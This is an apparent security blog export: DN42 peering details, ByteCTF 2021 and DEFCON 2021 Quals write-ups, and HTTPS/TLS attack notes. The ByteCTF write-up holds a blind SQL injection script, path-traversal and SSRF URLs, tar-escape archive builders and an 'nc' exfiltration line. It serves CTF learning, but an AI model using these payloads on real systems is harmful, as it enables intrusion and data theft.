[{"title":"DN42","url":"/20770302/DN42/","content":"DN42AboutLiki4\n只是 DN42 的一个小玩家，\n用来 peer 的小鸡是一台 BuyVM 的 VPS，\n以后应该也会一直续费下去，\n因为系统暂时是 RouterOS v6，\n所以没有 WireGuard，\n但是可以支持各种各样的隧道，\n为了方便就直接用 GRE/Plain 来 peer 了，\n等到 RouterOS v7 发布正式版就更新，\n就可以用 WireGuard 来 peer 了。\nInfoMy Informations:\n\nASN:        4242420927\n\nLV1 - Las Vegas, US, BuyVM\nTunnel:     GRE&#x2F;Plain\nIPv4:       199.19.226.83\nMTU:        1476\n\nDN42\nIPv4:     172.21.77.33\nIPv6:     fd80:96c2:e41e:3dcc::1\nLink-Local Support: No\nMultiprotocol BGP Support: Yes\n\n\n","categories":[],"tags":["dn42"]},{"title":"ByteCTF 2021 Web WP","url":"/20211018/ByteCTF-2021-Web-WP/","content":"ByteCTF 2021 Web WriteUp一点感想不愧是字节\n比赛题目的质量还是很高的\n相比平时打的很多其他比赛更能让人有去解题的欲望\n虽然很难但是打得很开心\n最后只做出来 double sqli 和 easy_extract\nWebdouble sqli通过报错知道是个叫 ClickHouse 的 DBMS\n语句是\nSELECT ByteCTF from hello where 1=1\n没有任何过滤，通过布尔盲注可以得到数据库内的数据\n\ndatabase: defaulttable: hello| ByteCTF            || —————— || Welcome to ByteCTF |\n\ndatabase: ctftable: hint| id                                     || ————————————– || you_dont_have_permissions_to_read_flag |\n\nClickHouse version：21.3.2.5database user： user_02\n\n一开始以为是 CVE-2021-25263但没有读文件的权限\n从 user_02 的用户名猜测应该有一个 user_01 用户user_01 用户应该有 user_02 用户所没有的权限，可以看到一些对 user_02 用户隐藏的表\nClickHouse 是通过 HTTP 协议来连接/管理数据库的可以通过 URL 函数 ssrf 执行 ClickHouse HTTP 客户端的查询\nSELECT field FROM url('http://127.0.0.1:8123/?username=user_02=password=123456&amp;query=SELECT 1','LineAsString','field String')\n但是没有账号密码\n在 Web 应用的 /files/ 目录有文件浏览，尝试进行目录穿越发现了任意文件读\nhttp:&#x2F;&#x2F;39.105.116.246:30001&#x2F;files..&#x2F;\nhttp:&#x2F;&#x2F;39.105.116.246:30001&#x2F;files..&#x2F;var&#x2F;lib&#x2F;clickhouse&#x2F;access&#x2F;users.list\nhttp:&#x2F;&#x2F;39.105.116.246:30001&#x2F;files..&#x2F;var&#x2F;lib&#x2F;clickhouse&#x2F;access&#x2F;a2492bae-77c4-e443-4fce-c04e47cd43a1.sql\na2492bae-77c4-e443-4fce-c04e47cd43a1.sql 文件内容如下\nATTACH USER user_01 IDENTIFIED WITH plaintext_password BY 'e3b0c44298fc1c149afb'; ATTACH GRANT SELECT ON ctf.* TO user_01;\n得到 user_01 的明文密码user_01:e3b0c44298fc1c149afb\n有 ctf 库的全部权限构造请求\nselect name from system.tables\ntarget = \"field\"\ntarget_table = \"url(%27http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2bname%2bfrom%2bsystem.tables%27,%27LineAsString%27,%27field%20String%27)\"\n得到 ctf 库中存在两张表，hint 和 flag 表，然后继续得到 flag 表列名 flag最后得到 flag\nselect flag from ctf.flag\ntarget = \"field\"\ntarget_table = \"url(%27http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2bflag%2bfrom%2bctf.flag%27,%27LineAsString%27,%27field%20String%27)\"\n\nexp\nimport requests\nimport string\n\nurl_tpl = \"http://39.105.116.246:30001/?id=1 and if(&#123;query&#125;,1,0)\"\n\nquery_tpl_count = \"count(&#123;target&#125;)\"\nquery_tpl_length = \"char_length(toString(&#123;target&#125;))\"\nquery_tpl_data = \"(select mid(toString(&#123;target&#125;),&#123;offset&#125;,1) from &#123;table&#125; limit 1 offset &#123;toffset&#125;)='&#123;arg&#125;'\"\n\n# target = \"DATABASE()\"\n# target_table = \"system.databases\"\n# target = \"cluster\"\n# target_table = \"system.clusters\"\n# target = \"name\"\n# target_table = \"system.dictionaries\"\n# target = \"field\"\n# target_table = \"url(%27http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2bname%2bfrom%2bsystem.tables%27,%27LineAsString%27,%27field%20String%27)\"\ntarget = \"field\"\ntarget_table = \"url(%27http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2bflag%2bfrom%2bctf.flag%27,%27LineAsString%27,%27field%20String%27)\"\n\nascii_space = string.printable\n\ndef getCnt():\n    result = \"\"\n    offset = 1\n    while True:\n        flag = True\n        query_target = query_tpl_count.format(target=target)\n        for c in string.digits:\n            query = query_tpl_data.format(target=query_target, offset=offset, arg=c, table=target_table, toffset=0)\n            url = url_tpl.format(query=query)\n            # print(url)\n            res = requests.get(url)\n            if \"Welcome to ByteCTF\" in res.text:\n                # print(query)\n                result += c\n                print(result)\n                flag = False\n                break\n        offset += 1\n        if flag:\n            break\n    return int(result)\n\n\ndef getDataLen(cnt):\n    toffset = 0\n    for _ in range(cnt):\n        result = \"\"\n        offset = 1\n        while True:\n            flag = True\n            query_target = query_tpl_length.format(target=target)\n            for c in string.digits:\n                query = query_tpl_data.format(target=query_target, offset=offset, arg=c, table=target_table, toffset=toffset)\n                url = url_tpl.format(query=query)\n                # print(query)\n                res = requests.get(url)\n                if \"Welcome to ByteCTF\" in res.text:\n                    result += c\n                    print(result)\n                    flag = False\n                    break\n            offset += 1\n            if flag:\n                getData(int(toffset))\n                break\n        toffset += 1\n\n\ndef getData(toffset):\n    result = \"\"\n    offset = 1\n    while True:\n        flag = True\n        for c in ascii_space:\n            query = query_tpl_data.format(target=target, offset=offset, arg=c, table=target_table, toffset=toffset).replace('\\\\', '\\\\\\\\')\n            url = url_tpl.format(query=query)\n            # print(query)\n            res = requests.get(url)\n            if \"Welcome to ByteCTF\" in res.text:\n                result += c\n                print(result)\n                flag = False\n                break\n        offset += 1\n        if flag:\n            break\n\n\ncnt = getCnt()\ngetDataLen(cnt)\n# getData()\n\n\n\neasy_extract查看 http 返回头，发现是个 nodejs 写的应用，用户上传 tar 压缩文件，后端解压后将压缩包里的文件名返回给前端。\n访问 /robots.txt，发现有个 Dockerfile，内容为：\nFROM node:current-alpine\nENV NODE_ENV&#x3D;production\nWORKDIR &#x2F;app\n\nARG CHALL_FLAG\nENV CHALL_FLAG $CHALL_FLAG\n\nRUN apk update &amp;&amp; apk add bash musl-dev gcc\n\nCOPY [&quot;package.json&quot;, &quot;.&#x2F;&quot;]\nRUN npm install -g nodemon --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org &amp;&amp; \\\n    npm install --production --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org\n\nCOPY . .\nRUN echo $CHALL_FLAG &gt; &#x2F;flag &amp;&amp; chmod 0600 &#x2F;flag &amp;&amp; gcc readflag.c -o &#x2F;readflag  &amp;&amp; chmod u+s &#x2F;readflag &amp;&amp; \\\n    mkdir &#x2F;app&#x2F;data &amp;&amp; chmod -R 755 &#x2F;app &amp;&amp; chown -R node &#x2F;app&#x2F;data\n\nUSER node\n\nCMD [&quot;nodemon&quot;, &quot;--exec&quot;, &quot;npm start&quot;]\n\n2021 8月 nodejs tar 的两个 cvehttps://portswigger.net/daily-swig/node-js-archives-serious-tar-handling-vulnerabilities-with-software-update\n解压出来的文件默认是保存在 /app/data 里的，通过软链接与特殊名字的文件夹实现任意文件写\ntar 里允许打包软链接，这里打包一个指向根目录的软链接\nln -s &#x2F; .&#x2F;111\ntar -zcvf asd.tar .&#x2F;111\n\n上传 asd.tar， 页面返回结果\ndone. files:\n\n111\n111&#x2F;app\n111&#x2F;bin\n111&#x2F;dev\n111&#x2F;etc\n111&#x2F;flag\n...\n111&#x2F;readflag\n...\n111&#x2F;home&#x2F;node\n...\n\n\n由此可以覆盖 /app/data 外的东西，覆盖任意文件,这里写入了 /tmp/1\nimport tarfile\nimport os.path\nfrom tarfile import TarInfo, SYMTYPE,REGTYPE,LNKTYPE,DIRTYPE\n\ntarinfo1 = TarInfo()\ntarinfo1.type= DIRTYPE\ntarinfo1.name = \"foo/1\"\ntarinfo3 = TarInfo()\ntarinfo3.type= SYMTYPE\ntarinfo3.name = \"foo\\\\1\"\ntarinfo3.linkname = \"/tmp\"\ntarinfo2 = TarInfo()\ntarinfo2.type= LNKTYPE\ntarinfo2.name = \"foo\\\\1/1\"\ntarinfo2.linkname = \"/app/data/123\"\n\ntar4 = TarInfo()\ntar4.type = REGTYPE\ntar4.name='123'\n\ndef make_tarfile(output_filename, ):\n    with tarfile.open(output_filename, \"w:gz\") as tar:\n        tar.addfile(tar4, open('test'))\n        tar.addfile(tarinfo1,'test')\n        tar.addfile(tarinfo3, 'test')\n        tar.addfile(tarinfo2)\n\nmake_tarfile(\"a.tar\")\n\n从 Dockerfile 里得知，应用以 node 用户身份运行，只能修改 /app/data 和 /home/node 文件夹下的东西。\nnodemon 默认配置检测了 .*/**/*.js 和 ./**/*.json，当发生修改或有新文件创建的时候会重启，再次运行npm start 的时候，会加载当前用户下目录下的 .npmrc，可以向 .npmrc 注入一些选项。查阅 npm 的文档，script-shell 指定了执行 npm scripts 的 shell，默认 Windows上为 cmd.exe，posix 上为 bash，通过修改 script-shell 选项来在 nodemon 重启的时候执行我们想要的脚本。\n传一个 xxx.sh 上去\n#!/bin/sh\n/readflag | nc vps_ip vps_port\nvps 上 起一个 nc 监听 tcp 连接.npmrc 内容\nscript-shell &#x3D; &#x2F;app&#x2F;data&#x2F;xxx.sh\n生成 tar 文件：\nimport tarfile\nimport os.path\nfrom tarfile import TarInfo, SYMTYPE,REGTYPE,LNKTYPE,DIRTYPE,AREGTYPE\n\n\ntarinfo1 = TarInfo()\ntarinfo1.type= DIRTYPE\ntarinfo1.name = \"ao/1\"\ntarinfo11 = TarInfo()\ntarinfo11.type= DIRTYPE\ntarinfo11.name = \"ao/2\"\ntarinfo3 = TarInfo()\ntarinfo3.type= SYMTYPE\ntarinfo3.name = \"ao\\\\1\"\ntarinfo3.linkname = \"/home/node\"\ntarinfo31 = TarInfo()\ntarinfo31.type= SYMTYPE\ntarinfo31.name = \"ao\\\\2\"\ntarinfo31.linkname = \"/\"\ntarinfo2 = TarInfo()\ntarinfo2.type= LNKTYPE\ntarinfo2.name = \"ao\\\\1/.npmrc\"\ntarinfo2.linkname = \"/app/data/app.js\"\n\n\ndef make_tarfile(output_filename, ):\n    with tarfile.open(output_filename, \"w:gz\") as tar:\n        tar.add('npmrc', recursive=False,arcname=\"app.js\")\n        tar.add(\"xxx.sh\",recursive=False,arcname=\"xxx.sh\")\n        tar.addfile(tarinfo1)\n        tar.addfile(tarinfo11)\n        tar.addfile(tarinfo3)\n        tar.addfile(tarinfo31)\n        tar.addfile(tarinfo2)\n\nmake_tarfile(\"b.tar\")\n\n上传 b.tar，vps 上可看到 flag\n","categories":[],"tags":["CTF WriteUp"]},{"title":"Web 安全基础知识思维导图","url":"/20210812/Web-%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/","content":"前言转载自 Annevi\n在我查漏补缺的时候帮到我很多\n\n\n\t\n    \n\t\n\n\n\n","categories":[],"tags":[]},{"title":"HTTPS 协议学习","url":"/20210812/HTTPS-%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/","content":"前言之前实习面试之前去参考了 Annevi 的博客，\n发现了很多很棒的记录，\n打算转载一些\n什么是https？https协议(Hyper Text Transfer Protocol over SecureSocket Layer)，翻译过来就是建立在安全套接字层上的超文本传输协议(http)，很显然，https是为了确保http协议的安全性而出现的。https在http的基础上加入了SSL协议(SSL3.1后称TLS)以下均称TLS，通过TLS协议使得http数据包能够安全的在网络中进行传输。现在大多数的站点都已经使用了https协议进行通信，也就是在浏览器中看到的所谓的小绿锁🔐。\n\n为什么需要https？通过上面的介绍可以知道，使用https是为了确保http通道的安全性，那么这个安全性究竟体现在哪里呢？\n在说https所解决的安全问题之前，我们首先需要了解一种攻击手法: 中间人攻击\n\n中间人攻击（英语：Man-in-the-middle attack，缩写：MITM）在密码学和计算机安全领域中是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。\n\n从上述资料中可以知道，中间人攻击实际上就是攻击者监听并截获了通信双方的数据，对这些数据加以修改后代替原有的发送方将修改后的信息发送给原先的接收方，在这个过程中，中间人就相当于是一个”透明代理“，通信双方并不知道有这个”中间人“的存在。\n而要成功的进行中间人攻击是有条件的：\n\n一个中间人攻击能成功的前提条件是攻击者能将自己伪装成每一个参与会话的终端，并且不被其他终端识破。中间人攻击是一个（缺乏）相互认证的攻击。\n\n回到http数据包网络通信过程中，我们知道http协议的数据是在传输层通过TCP协议进行封装传输的，而TCP协议在传输的过程中则是以明文形式进行的，也就是在http数据包在网络中明文”裸奔”。\n\nTCP协议虽确保了通信双方的可靠交付但是并没有对通信双方进行身份认证，也就是说，http客户端并不知道与自己通信的是不是想要访问的”真实”服务端，因此就给中间人攻击提供了机会。\n由于HTTP存在被中间人攻击的问题，人们在思考如何解决这一安全问题的时候提出了https协议，https协议通过SSL层对http数据包进行加密，同时使用数字证书等手段对通信双方的身份进行验证，较好的解决了这一安全问题。\nhttps具体工作过程通过上面的介绍可以知道，https是将http协议通过TLS的封装后的一种安全协议。http与https在网络传输过程中的基本结构如下\n\nhttps协议在传输的过程中首先将http原始请求包经过TLS层进行加密封装再送入传输层进行TCP传输。\n基础知识在介绍https工作原理之前，我们需要简单的了解一些密码学的基础知识\n对称加密\n对称加密是最快速、最简单的一种加密方式，加密（encryption）与解密（decryption）用的是同样的密钥（secret key）。\n\n对称加密其特点主要是效率高、速度快，但是安全性差，由于加解密使用相同的密钥，因此密钥管理负担较重。主要算法有DES、3DES、AES、RC5、RC6等。\n非对称加密\n非对称加密加、解密使用不同的密钥，一把作为公开的公钥，另一把作为私钥。公钥加密的信息，只有私钥才能解密。反之，私钥加密的信息，只有公钥才能解密。\n\n非对称加密由于其加解密密钥不同而得名，其安全性更高，密钥管理方便。但是加密和解密耗时长，效率差。\n与对称加密相比，非对称加密无需在客户端和服务端之间共享密钥，只要私钥不发送给任何用户，即是公钥在互联网上被截获，也无法被解密，而只有公钥是没有任何攻击价值的。常见的非对称加密算法有RSA等，非对称加解密过程：\n\n服务端生成一堆公钥和私钥\n私钥仅由服务端保存，公钥通过互联网发送给客户端。\n客户端使用公钥加密明文并在网络中传输给服务端\n服务端使用自己持有的私钥解密密文得到对应的明文\n\n数字签名在一封信中，文末的签名是为了表示这封信是签名者写的。计算机中，数字签名也是相同的含义：证明消息是某个特定的人，而不是随随便便一个人发送的（有效性）；除此之外，数字签名还能证明消息没有被篡改（完整性）。\n\n简单来说，数字签名（digital signature）是公钥密码的逆应用：用私钥加密消息，用公钥解密消息。\n用私钥加密的消息称为签名，只有拥有私钥的用户可以生成签名。用公钥解密签名这一步称为验证签名，所有用户都可以验证签名(因为公钥是公开的)\n\n签名的生成，一般来说，不直接对消息进行签名，而是对消息的哈希值进行签名，步骤如下。\n\n对消息进行哈希计算，得到哈希值\n利用私钥对哈希值进行加密，生成签名\n将签名附加在消息后面，一起发送过去\n\n签名的验证\n\n收到消息后，提取消息中的签名\n用公钥对签名进行解密，得到哈希值1。\n对消息中的正文进行哈希计算，得到哈希值2。\n比较哈希值1和哈希值2，如果相同，则验证成功。\n\n简单地说，数字签名就是使用私钥去加密消息摘要得到的密文。\n数字证书证书实际上就是对公钥进行数字签名，它是对公钥合法性提供证明的技术。\n\n数字证书是指在互联网通讯中标志通讯各方身份信息的一个数字认证，人们可以在网上用它来识别对方的身份。数字证书对网络用户在计算机网络交流中的信息和数据等以加密或解密的形式保证了信息和数据的完整性和安全性。\n\n考虑这样一种场景：我们对签名进行验证时，需要用到公钥。如果公钥也是伪造的，那怎么办？如果公钥是假的，验证数字签名那就无从谈起，根本不可能从数字签名确定对方的合法性。\n在非对称加密通信过程中，服务器需要将公钥发送给客户端，在这一过程中，公钥很可能会被第三方拦截并替换，然后这个第三方就可以冒充服务器与客户端进行通信，这就是传说中的“中间人攻击”(man in the middle attack)。解决此问题的方法是通过受信任的第三方交换公钥，具体做法就是服务器不直接向客户端发送公钥，而是要求受信任的第三方，也就是证书认证机构 (Certificate Authority, 简称 CA)将公钥合并到数字证书中，然后服务器会把公钥连同证书一起发送给客户端，私钥则由服务器自己保存以确保安全。数字证书一般包含以下内容：\n\n证书所有者的公钥\n证书所有者的专有名称\n证书颁发机构的专有名称\n证书的有效起始日期\n证书的过期日期\n证书数据格式的版本号\n序列号，这是证书颁发机构为该证书分配的唯一标识符\n\n\n接下来又有问题了：验证证书中的数字签名需要另一个公钥，那么这个公钥的合法性又该如何保证？该问题可以无限循环下去，岂不是到不了头了？这已经是个社会学问题了。我们为什么把钱存进银行？因为我们相信银行，它是一个可信的机构（虽然也有破产的风险）。跟银行一样，我们需要一个可信的机构来颁发证书和提供公钥，只要是它提供的公钥，我们就相信是合法的。\n这种机构称为认证机构(Certification Authority， CA)。CA就是能够认定”公钥确实属于此人”，并能生成公钥的数字签名的组织或机构。CA有国际性组织和政府设立的组织，也有通过提供认证服务来盈利的组织。\n\n证书链证书链，也称为证书路径，是用于认证实体合法身份的证书列表，具体到 HTTPS 通信中，就是为了验证服务器的合法身份。之所以使用证书链，是为了保证根证书 的安全，中间层可以看做根证书的代理，起到了缓冲的作用。\n从经典问题谈起我们从一个经典的问题开始：当我们在浏览器中输入一个启用了https的域名到我们看到页面回显，发生了什么？\n在以往http的情况下，这个问题的答案相信许多人已经非常清晰了，但是若目标站点启用了https，又会有什么不一样的地方呢？\n带着这个问题，我们重新来分析一下这个“加强版”的经典面试题。\n域名解析由于web服务是建立在TCP协议之上的，因此需要使用ip地址来进行通信，而域名解析就是通过域名去DNS服务器查询获取对应的IP的过程，也是这个经典问题的第一步。\n建立TCP连接浏览器拿到对应域名的IP地址后，准备向目标服务器发起连接请求，由于我们是向web服务器发起连接，因此是通过TCP协议进行连接的，自然也就有TCP的三次握手建立连接的过程。我们可以通过wireshark抓包来查看这一过程。\n\n通过设置简单的过滤器，访问https://annevi.cn即可获取到三次握手的过程。我们顺带来具体的看一下。\n\n首先是客户端向服务器发送一个SYN，表示要求建立连接，同时发送Seq=0,随后客户端进入SYN-SENT阶段。\n服务器端接收到来自客户端的TCP报文之后，结束LISTEN阶段。并返回一段TCP报文，构造一个[SYN ACK]的数据包，同时将ack值设为seq+1。随后服务器端进入SYN-RCVD阶段。\n客户端接收到来自服务器端的确认收到数据的TCP报文之后，明确了从客户端到服务器的数据传输是正常的，结束SYN-SENT阶段。并返回最后一段TCP报文,设置seq+=1 ack则等于服务器端数据包的seq+1,随后客户端进入ESTABLISHED阶段。\n\n完成上述基本步骤后，一个完整的TCP连接就成功建立了\n\nTLS握手*为了建立安全连接，通信双方在完成TCP的三次握手之后，紧接着就要进行TLS的四次握手，TLS握手的目的主要是为了：\n\n商定双方通信所使用的的 TLS 版本 (例如 TLS1.0, 1.2, 1.3等等)；\n确定双方所要使用的密码组合；\n客户端通过服务器的公钥和数字证书上的数字签名验证服务端的身份；\n生成会话密钥，该密钥将用于握手结束后的对称加密。\n\n\n下面将介绍一下TLS握手的过程\nClient Hello客户端生成并发送一段随机字符串以及所支持的加密算法，如图：\n\nServer Hello服务器发送”Server Hello”消息对客户端进行回应，该消息包含了数字证书，服务器选择的密码组合和”server random”随机字符串\n\n验证客户端对服务器发来的证书进行验证，确保对方的合法身份，验证过程可以细化为以下几个步骤：\n\n检查数字签名\n验证证书链\n检查证书的有效期\n检查证书的撤回状态 (撤回代表证书已失效)\n\nPre-master secret客户端在前面的步骤中已经获取到了服务端所给予的公钥，因此就可以发送使用这个公钥加密之后的另一个随机字符串”pre-master secret (预主密钥)”，这个字符串是经过服务器的公钥加密过的，只有对应的私钥才能解密。\n解密 Pre-master secret服务器使用私钥解密Pre-master secret,获取其明文。\n生成共享密钥客户端和服务器均使用 client random，server random 和 premaster secret，并通过相同的算法生成相同的共享密钥 KEY，用于后面的对称加密传输。\n客户端就绪客户端发送经过共享密钥 KEY加密过的 finished信号。\n服务端就绪服务器发送经过共享密钥 **KEY **加密过的finished信号。\n达成安全通信握手完成，双方使用对称加密进行安全通信。\n\n总结总的来说，TLS的四次握手主要概括如下：\n客户端发出请求，向服务端提供以下信息：\n\n支持的协议版本，比如 TLS 1.0 版。\n一个客户端生成的随机数，稍后用于生成”对话密钥”。\n支持的加密方法，比如 RSA 公钥加密。\n支持的压缩方法。\n\n服务器回应以下信息：\n\n确认使用的加密通信协议版本，比如 TLS 1.0 版本。如果浏览器与服务器支持的版本不一致，服务器关闭加密通信。\n确认使用的加密方法，比如 RSA 公钥加密，返回加密公钥\n服务器证书\n\n客户端回应\n\n验证证书的合法性（颁发证书的机构是否合法，证书中包含的网站地址是否与正在访问的地址一致等），如果证书受信任，则浏览器栏里面会显示一个小锁头，否则会给出证书不受信的提示。\n如果证书受信任，或者是用户接受了不受信的证书，浏览器会生成一串随机数的密码，并用证书中提供的公钥加密。\n使用约定好的 HASH 计算握手消息，并使用生成的随机数对消息进行加密，最后将之前生成的所有信息发送给网站。\n\n服务器\n\n使用自己的私钥将信息解密取出密码，使用密码解密浏览器发来的握手消息，并验证是否与浏览器发来的一致。\n使用密码加密一段握手消息，发送给浏览器。\n\n\n可以看到，https 建立连接需要7次握手(TCP 3次 TLS 4次)\nTLS 的安全问题OpenSSL心脏滴血漏洞\n2014年4月8日，互联网上曝出了严重一个漏洞称为Heartbleed，该漏洞由安全公司Codenomicon和谷歌安全工程师发现。Heartbleed漏洞，造成许任何人在互联网上阅读系统的内存保护脆弱的OpenSSL的软件版本。 这种妥协密钥用于识别服务提供者和加密流量,用户名和密码的和实际的内容。 这允许攻击者窃听通信、窃取数据直接从服务和用户和模拟服务和用户。\n\n原理OpenSSL 在实现 TLS 和 DTLS 的心跳处理逻辑时，存在编码缺陷。OpenSSL 的心跳处理逻辑没有检测心跳包中的长度字段是否和后续的数据字段相符合，攻击者可以利用这点，构造异常的数据包，来获取心跳数据所在的内存区域的后续数据。这些数据中可能包含了证书私钥、用户名、用户密码、用户邮箱等敏感信息。该漏洞允许攻击者，从内存中读取多达64KB的数据。\n常见场景\n使用了openssl扩展库加密的网络协议\nhttps\nSSL VPN\n邮件服务器\n\n测试方案nmap\nnmap -sV -p 443 --script ssl-heartbleed.nse [Target]\n\nhttps://filippo.io/Heartbleed/\nhttp://wangzhan.360.cn/heartbleed/\nDowngrade（降级攻击）降级攻击是一种对计算机系统或者通信协议的攻击，在降级攻击中，攻击者故意使系统放弃新式、安全性高的工作方式，反而使用为向下兼容而准备的老式、安全性差的工作方式，降级攻击常被用于中间人攻击，讲加密的通信协议安全性大幅削弱，得以进行原本不可能做到的攻击。 在现代的回退防御中，使用单独的信号套件来指示自愿降级行为，需要理解该信号并支持更高协议版本的服务器来终止协商，该套件是 TLS_FALLBACK_SCSV(0x5600)\nMITM（中间人攻击）MITM(Man-in-the-MiddleAttack) ，是指攻击者与通讯的两端分别创建独立的联系，并交换其所有收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个对话都被攻击者完全控制，在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。一个中间人攻击能成功的前提条件是攻击者能够将自己伪装成每个参与会话的终端，并且不被其他终端识破。\nBEAST (野兽攻击）BEAST(CVE-2011-3389) BEAST是一种明文攻击，通过从SSL/TLS加密的会话中获取受害者的COOKIE值（通过进行一次会话劫持攻击），进而篡改一个加密算法的 CBC（密码块链）的模式以实现攻击目录，其主要针对TLS1.0和更早版本的协议中的对称加密算法CBC模式。\nCRIME（罪恶攻击）CRIME(CVE-2012-4929)，全称Compression Ratio Info-leak Made Easy，这是一种因SSL压缩造成的安全隐患，通过它可窃取启用数据压缩特性的HTTPS或SPDY协议传输的私密Web Cookie。在成功读取身份验证Cookie后，攻击者可以实行会话劫持和发动进一步攻击。\nSSL 压缩在下述版本是默认关闭的： nginx 1.1.6及更高/1.0.9及更高（如果使用了 OpenSSL 1.0.0及更高）， nginx 1.3.2及更高/1.2.2及更高（如果使用较旧版本的 OpenSSL）。\n如果你使用一个早期版本的 nginx 或 OpenSSL，而且你的发行版没有向后移植该选项，那么你需要重新编译没有一个 ZLIB 支持的 OpenSSL。这会禁止 OpenSSL 使用 DEFLATE 压缩方式。如果你禁用了这个，你仍然可以使用常规的 HTML DEFLATE 压缩。\nPOODLE漏洞（卷毛狗攻击）2014年10月14号由Google发现的POODLE漏洞，全称是Padding Oracle On Downloaded Legacy Encryption vulnerability，又被称为“贵宾犬攻击”（CVE-2014-3566），POODLE漏洞只对CBC模式的明文进行了身份验证，但是没有对填充字节进行完整性验证，攻击者窃取采用SSL3.0版加密通信过程中的内容，对填充字节修改并且利用预置填充来恢复加密内容，以达到攻击目的。\nTLS POODLE（TLS卷毛狗攻击）TLS POODLE(CVE-2014-8730) 该漏洞的原理和POODLE漏洞的原理一致，但不是SSL3协议。由于TLS填充是SSLv3的一个子集，因此可以重新使用针对TLS的POODLE攻击。TLS对于它的填充格式是非常严格的，但是一些TLS实现在解密之后不执行填充结构的检查。即使使用TLS也不会容易受到POODLE攻击的影响。\nCCSCCS(CVE-2014-0224) 全称openssl MITM CCS injection attack，Openssl 0.9.8za之前的版本、1.0.0m之前的以及1.0.1h之前的openssl没有适当的限制ChangeCipherSpec信息的处理，这允许中间人攻击者在通信之间使用0长度的主密钥。\nFREAKFREAK(CVE-2015-0204) 客户端会在一个全安全强度的RSA握手过程中接受使用弱安全强度的出口RSA密钥，其中关键在于客户端并没有允许协商任何出口级别的RSA密码套件。\nDROWN（溺水攻击/溺亡攻击）2016年3月发现的针对TLS的新漏洞攻击——DROWN（Decrypting RSA with Obsolete and Weakened eNcryption，CVE-2016-0800），也即利用过时的、弱化的一种RSA加密算法来解密破解TLS协议中被该算法加密的会话密钥。 具体说来，DROWN漏洞可以利用过时的SSLv2协议来解密与之共享相同RSA私钥的TLS协议所保护的流量。 DROWN攻击依赖于SSLv2协议的设计缺陷以及知名的Bleichenbacher攻击。\n通常检查以下两点服务器的配置\n\n服务器允许SSL2连接，需要将其关闭。\n私钥同时用于允许SSL2连接的其他服务器。例如，Web服务器和邮件服务器上使用相同的私钥和证书，如果邮件服务器支持SSL2，即使web服务器不支持SSL2，攻击者可以利用邮件服务器来破坏与web服务器的TLS连接。\n\nOpenssl Padding OracleOpenssl Padding Oracle(CVE-2016-2107) openssl 1.0.1t到openssl 1.0.2h之前没有考虑某些填充检查期间的内存分配，这允许远程攻击者通过针对AES CBC会话的padding-oracle攻击来获取敏感的明文信息。\n参考资料\nhttps://segmentfault.com/a/1190000012731888\nhttps://segmentfault.com/a/1190000021559557\nhttps://zhuanlan.zhihu.com/p/22142170\nhttps://juejin.cn/post/6844904089495535624#heading-14\nhttps://zhuanlan.zhihu.com/p/22917510\nhttps://payloads.online/archivers/2018-04-27/5\n\n","categories":[],"tags":[]},{"title":"DEFCON 2021 Quals threefactooorx","url":"/20210503/DEFCON-2021-Quals-threefactooorx/","content":"DEFCON 2021 Quals threefactooorx直接转 4qE 的了 233\n反混淆插件源码的主要部分在 content_script.js， 但因为经过混淆，根本不是给人看的，于是得先反混淆。考虑到 js 本身就是解释型语言，我可以直接在 chrome devtools 中下断点，然后在 console 里打印我想要的变量值。最外层的函数不是特别多，所以依次下断点配合 devtools 的控制台获取变量。\n这段过程都是体力活，就不具体描述了，最后反混淆出了大致能看的 js 代码 readable_code.js。\n最后看下来，反混淆的部分是最重要的，因为后面的分析都不是很难。\n本地分析反混淆以后，可以看到在源码的最后有一段代码会定时向后台获取 flag 并输出。\nobserver[\"observe\"](document, config),\n    console[\"log\"](\"The observer is observing.\"),\n    setTimeout(function() &#123;\n      const _0xd26915 = &#123;&#125;;\n      _0xd26915[\"getflag\"] = _0x10b2d5[\"xOsuT\"], //true\n          chrome[\"runtime\"][\"sendMessage\"](_0xd26915, function(_0x336e82) &#123;\n            // _0x336382 is response from backend included with flag\n            FLAG = _0x336e82[\"flag\"],\n                console['log']((\"flag: \" + _0x336e82[\"flag\"]));\n\n            // four &amp;&amp; and display flag on the #thirdfactooor\n            nodesadded == 5 &amp;&amp; (nodesdeleted == 3) &amp;&amp; \\\n            attrcharsadded == 23 &amp;&amp; (domvalue == 2188) &amp;&amp; \\\n             (document[\"getElementById\"](\"thirdfactooor\")['value'] = _0x336e82[\"flag\"]);\n\n            // append new div\n            const _0x369bcb = document[\"createElement\"](\"div\");\n            _0x369bcb[\"setAttribute\"](\"id\", \"processed\"),\n                document[\"body\"][\"appendChild\"](_0x369bcb);\n          &#125;);\n    &#125;, 500);\n\n其中这个 document[&quot;getElementById&quot;](&quot;thirdfactooor&quot;) 是在 check_dom() 会进行的一项检查，我们需要让 html 中有一个 id 为 thirdfactooor 的 input 标签。\nif (document[\"querySelector\"](\"thirdfactooor\")[\"tagName\"] == \"INPUT\") &#123;&#125;\n\n只需要满足\nnodesadded == 5 &amp;&amp; (nodesdeleted == 3) &amp;&amp; attrcharsadded == 23 &amp;&amp; (domvalue == 2188)\n\n依次找到赋值的地方\n/*\n > _0x8a010b instanceof MutationRecord\n &lt;· true\n*/\nif (_0x8a010b[\"type\"] === \"childList\") &#123;\n    if (false) &#123;\n        // never execute\n    &#125; else &#123;\n        nodesadded += _0x8a010b[\"addedNodes\"][\"length\"],\n        nodesdeleted += _0x8a010b[\"removedNodes\"][\"length\"];\n    &#125;\n&#125; else &#123;\n    if ((_0x8a010b[\"type\"] === 